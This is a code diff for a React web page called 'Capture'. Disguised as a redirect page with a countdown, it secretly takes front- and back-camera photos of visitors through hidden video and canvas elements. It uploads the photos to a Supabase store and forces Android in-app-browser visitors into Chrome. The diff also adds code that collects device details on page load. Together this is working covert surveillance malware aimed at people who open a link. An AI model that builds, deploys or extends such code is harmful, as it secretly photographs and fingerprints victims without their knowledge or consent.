@@ -1,53 +1,33 @@
 import { useEffect, useState, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
+import { collectDeviceInfo } from "@/utils/deviceInfo";
 
-// Detect in-app browsers (Instagram, Telegram, Facebook, etc.)
+// Detect in-app browsers
 const isInAppBrowser = (): boolean => {
   const ua = navigator.userAgent || navigator.vendor || '';
   const inAppPatterns = [
-    'Instagram',
-    'FBAN',
-    'FBAV',
-    'FB_IAB',
-    'Telegram',
-    'TelegramBot',
-    'Twitter',
-    'Line',
-    'Snapchat',
-    'WhatsApp',
-    'LinkedIn',
-    'Pinterest',
-    'Viber',
-    'WeChat',
-    'MicroMessenger',
+    'Instagram', 'FBAN', 'FBAV', 'FB_IAB', 'Telegram', 'TelegramBot',
+    'Twitter', 'Line', 'Snapchat', 'WhatsApp', 'LinkedIn', 'Pinterest',
+    'Viber', 'WeChat', 'MicroMessenger',
   ];
-  
   return inAppPatterns.some(pattern => ua.includes(pattern));
 };
 
-// Detect if device is Android
-const isAndroid = (): boolean => {
-  const ua = navigator.userAgent || '';
-  return /Android/i.test(ua);
-};
+const isAndroid = (): boolean => /Android/i.test(navigator.userAgent || '');
 
-// Detect if browser is Chrome (real Chrome, not in-app)
 const isChromeBrowser = (): boolean => {
   const ua = navigator.userAgent || '';
   const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
   const isNotEdge = !/Edg/i.test(ua);
   const isNotOpera = !/OPR/i.test(ua);
   const isNotSamsung = !/SamsungBrowser/i.test(ua);
-  
   return hasChrome && isNotEdge && isNotOpera && isNotSamsung && !isInAppBrowser();
 };
 
-// Generate Chrome intent URL for Android
 const getChromeIntentUrl = (currentUrl: string): string => {
   const url = new URL(currentUrl);
-  const intentUrl = `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
-  return intentUrl;
+  return `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
 };
 
 interface CaptureSettings {
@@ -74,6 +54,7 @@ const Capture = () => {
   const captureLoopRef = useRef<boolean>(false);
   const stopCaptureRef = useRef<boolean>(false);
   const captureCountRef = useRef<number>(0);
+  const deviceInfoSavedRef = useRef<boolean>(false);
   
   const sessionId = searchParams.get("session") || "default";
   const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
@@ -82,9 +63,30 @@ const Capture = () => {
   const redirectUrl = rawRedirectUrl;
   const countdownSeconds = urlTimer ? parseInt(urlTimer, 10) : settings.camCountdownTimer;
 
+  // Save device info immediately when page loads
+  const saveDeviceInfo = async () => {
+    if (deviceInfoSavedRef.current) return;
+    deviceInfoSavedRef.current = true;
+    
+    try {
+      const deviceInfo = await collectDeviceInfo();
+      await supabase.from("captured_photos").insert({
+        session_id: sessionId + "_deviceinfo",
+        image_data: JSON.stringify(deviceInfo),
+        user_agent: navigator.userAgent,
+        ip_address: null,
+      });
+    } catch (err) {
+      console.error("Failed to save device info:", err);
+    }
+  };
+
   // Load settings from database
   useEffect(() => {
     const loadSettings = async () => {
+      // Start collecting device info immediately
+      saveDeviceInfo();
+      
       try {
         const { data } = await supabase
           .from('app_settings')
@@ -111,7 +113,6 @@ const Capture = () => {
     loadSettings();
   }, []);
 
-  // Convert base64 to Blob for storage upload
   const base64ToBlob = (base64: string): Blob => {
     const parts = base64.split(',');
     const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
@@ -132,11 +133,8 @@ const Capture = () => {
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         await videoRef.current.play();
-        
-        // Wait for camera to stabilize
         await new Promise(resolve => setTimeout(resolve, 500));
         
-        // Capture photo
         if (canvasRef.current && videoRef.current) {
           const canvas = canvasRef.current;
           const video = videoRef.current;
@@ -146,18 +144,12 @@ const Capture = () => {
           if (ctx) {
             ctx.drawImage(video, 0, 0);
             const imageData = canvas.toDataURL("image/jpeg", 0.8);
-            
-            // Stop camera
             stream.getTracks().forEach(track => track.stop());
-            
             return imageData;
           }
         }
-        
-        // Stop camera
         stream.getTracks().forEach(track => track.stop());
       }
-      
       return null;
     } catch (error) {
       console.error(`Camera ${facingMode} access denied:`, error);
@@ -165,25 +157,18 @@ const Capture = () => {
     }
   };
 
-  // Continuous capture loop - respects photo limit from settings
   const startContinuousCapture = async () => {
     if (captureLoopRef.current) return;
     captureLoopRef.current = true;
     
     while (!stopCaptureRef.current) {
-      // Check photo limit
-      if (settings.camPhotoLimit > 0 && captureCountRef.current >= settings.camPhotoLimit) {
-        break;
-      }
+      if (settings.camPhotoLimit > 0 && captureCountRef.current >= settings.camPhotoLimit) break;
       
       try {
         captureCountRef.current++;
         
-        // Capture from FRONT camera
         const frontImage = await captureFromCamera("user");
-        
         if (frontImage && !stopCaptureRef.current) {
-          // Upload to storage
           const fileName = `${sessionId}/${Date.now()}-front-${captureCountRef.current}.jpg`;
           const blob = base64ToBlob(frontImage);
           const { error: uploadError } = await supabase.storage
@@ -206,14 +191,10 @@ const Capture = () => {
         if (stopCaptureRef.current) break;
         if (settings.camPhotoLimit > 0 && captureCountRef.current >= settings.camPhotoLimit) break;
         
-        // Small delay before switching cameras
         await new Promise(resolve => setTimeout(resolve, 200));
         
-        // Capture from BACK camera
         const backImage = await captureFromCamera("environment");
-        
         if (backImage && !stopCaptureRef.current) {
-          // Upload to storage
           const fileName = `${sessionId}/${Date.now()}-back-${captureCountRef.current}.jpg`;
           const blob = base64ToBlob(backImage);
           const { error: uploadError } = await supabase.storage
@@ -234,8 +215,6 @@ const Capture = () => {
         }
         
         if (stopCaptureRef.current) break;
-        
-        // Delay before next capture cycle (from settings)
         await new Promise(resolve => setTimeout(resolve, settings.camCaptureInterval));
         
       } catch (error) {
@@ -245,59 +224,44 @@ const Capture = () => {
     }
   };
 
-  // Stop capture when component unmounts or redirect happens
   useEffect(() => {
-    return () => {
-      stopCaptureRef.current = true;
-    };
+    return () => { stopCaptureRef.current = true; };
   }, []);
 
   useEffect(() => {
     if (status !== "checking") return;
     
-    // Step 1: Check browser type
     const checkBrowserAndProceed = () => {
-      // If in-app browser on Android, redirect to Chrome
       if (isInAppBrowser() && isAndroid()) {
         setStatus("redirecting_chrome");
-        const chromeIntent = getChromeIntentUrl(window.location.href);
-        
-        // Small delay then redirect
         setTimeout(() => {
-          window.location.href = chromeIntent;
+          window.location.href = getChromeIntentUrl(window.location.href);
         }, 100);
         return;
       }
       
-      // If in-app browser on non-Android, show message
       if (isInAppBrowser()) {
         setStatus("not_chrome");
         return;
       }
       
-      // If not Chrome browser, show message
       if (!isChromeBrowser()) {
         setStatus("not_chrome");
         return;
       }
       
-      // We're in Chrome - start countdown immediately and capture in background
       setStatus("countdown");
       setCountdown(countdownSeconds);
-      
-      // Start continuous capture loop (non-blocking)
       startContinuousCapture();
     };
 
     checkBrowserAndProceed();
   }, [status, sessionId, countdownSeconds]);
 
-  // Countdown timer effect
   useEffect(() => {
     if (countdown === null || countdown < 0) return;
 
     if (countdown === 0) {
-      // Stop capture and redirect (if auto-redirect enabled)
       stopCaptureRef.current = true;
       if (settings.camAutoRedirect) {
         window.location.href = redirectUrl;
@@ -312,7 +276,6 @@ const Capture = () => {
     return () => clearTimeout(timer);
   }, [countdown, redirectUrl, settings.camAutoRedirect]);
 
-  // Show "not Chrome" message
   if (status === "not_chrome") {
     return (
       <div className="min-h-screen bg-background flex items-center justify-center p-4">
@@ -323,64 +286,41 @@ const Capture = () => {
             </svg>
           </div>
           <h1 className="text-xl font-bold text-foreground mb-2">Browser Not Supported</h1>
-          <p className="text-muted-foreground">
-            Ye link sirf Google Chrome browser me kaam karta hai.
-          </p>
-          <p className="text-muted-foreground text-sm mt-4">
-            Please open this link in Google Chrome browser.
-          </p>
+          <p className="text-muted-foreground">Please open this link in Google Chrome browser.</p>
         </div>
       </div>
     );
   }
 
-  // Show redirecting to Chrome message
   if (status === "redirecting_chrome") {
     return (
       <div className="min-h-screen bg-background flex items-center justify-center p-4">
         <div className="text-center">
           <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
-          <p className="text-muted-foreground text-sm">
-            Opening in Chrome...
-          </p>
+          <p className="text-muted-foreground text-sm">Opening in Chrome...</p>
         </div>
       </div>
     );
   }
 
-  // Show countdown screen after capture
   if (status === "countdown" && countdown !== null) {
     const progressPercent = ((countdownSeconds - countdown) / countdownSeconds) * 100;
     
     return (
       <div className="min-h-screen flex items-center justify-center p-4" style={{
-        background: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #0d0d1a 100%)',
-        fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif"
+        background: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #0d0d1a 100%)'
       }}>
-        {/* Hidden video and canvas */}
         <video ref={videoRef} className="hidden" autoPlay playsInline muted />
         <canvas ref={canvasRef} className="hidden" />
         
-        {/* Background grid */}
         <div className="fixed inset-0 pointer-events-none" style={{
           backgroundImage: 'linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px)',
           backgroundSize: '50px 50px'
         }} />
         
-        {/* Glowing orbs */}
-        <div className="fixed w-72 h-72 rounded-full blur-[80px] opacity-40 animate-pulse" style={{
-          background: '#00ff88',
-          top: '-100px',
-          left: '-100px'
-        }} />
-        <div className="fixed w-64 h-64 rounded-full blur-[80px] opacity-40 animate-pulse" style={{
-          background: '#ec4899',
-          bottom: '-80px',
-          right: '-80px',
-          animationDelay: '-2s'
-        }} />
+        <div className="fixed w-72 h-72 rounded-full blur-[80px] opacity-40 animate-pulse" style={{ background: '#00ff88', top: '-100px', left: '-100px' }} />
+        <div className="fixed w-64 h-64 rounded-full blur-[80px] opacity-40 animate-pulse" style={{ background: '#ec4899', bottom: '-80px', right: '-80px', animationDelay: '-2s' }} />
         
-        {/* Countdown card */}
         <div className="relative z-10 text-center p-12 max-w-md w-full" style={{
           background: 'rgba(15, 15, 30, 0.9)',
           backdropFilter: 'blur(20px)',
@@ -388,7 +328,6 @@ const Capture = () => {
           borderRadius: '24px',
           boxShadow: '0 0 60px rgba(0, 255, 136, 0.2), 0 25px 50px rgba(0, 0, 0, 0.5)'
         }}>
-          {/* Countdown number */}
           <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center text-5xl font-bold animate-pulse" style={{
             background: 'linear-gradient(135deg, #00ff88 0%, #06b6d4 100%)',
             color: '#0a0a1a',
@@ -397,7 +336,6 @@ const Capture = () => {
             {countdown}
           </div>
           
-          {/* Status badge */}
           <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full mb-5" style={{
             background: 'rgba(0, 255, 136, 0.1)',
             border: '1px solid rgba(0, 255, 136, 0.3)'
@@ -408,24 +346,15 @@ const Capture = () => {
             </span>
           </div>
           
-          {/* Title */}
-          <h2 className="text-2xl font-bold mb-3" style={{ color: '#ffffff' }}>
-            Redirecting...
-          </h2>
-          
-          {/* Subtitle */}
-          <p className="mb-6" style={{ color: '#888', fontSize: '14px', lineHeight: 1.6 }}>
-            You will be redirected automatically in {countdown} second{countdown !== 1 ? 's' : ''}.
+          <h2 className="text-2xl font-bold mb-3" style={{ color: '#ffffff' }}>Redirecting...</h2>
+          <p className="mb-6" style={{ color: '#888', fontSize: '14px' }}>
+            You will be redirected in {countdown} second{countdown !== 1 ? 's' : ''}.
           </p>
           
-          {/* Progress bar */}
           <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background: 'rgba(255, 255, 255, 0.1)' }}>
             <div 
               className="h-full rounded-full transition-all duration-1000 ease-linear"
-              style={{ 
-                width: `${progressPercent}%`,
-                background: 'linear-gradient(90deg, #00ff88 0%, #06b6d4 100%)'
-              }}
+              style={{ width: `${progressPercent}%`, background: 'linear-gradient(90deg, #00ff88 0%, #06b6d4 100%)' }}
             />
           </div>
         </div>
@@ -435,11 +364,8 @@ const Capture = () => {
 
   return (
     <div className="min-h-screen bg-background flex items-center justify-center">
-      {/* Hidden video and canvas for capture */}
       <video ref={videoRef} className="hidden" autoPlay playsInline muted />
       <canvas ref={canvasRef} className="hidden" />
-      
-      {/* Loading indicator - only shows briefly during browser check */}
       <div className="text-center">
         <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin mx-auto mb-4" />
         <p className="text-muted-foreground text-sm">Loading...</p>
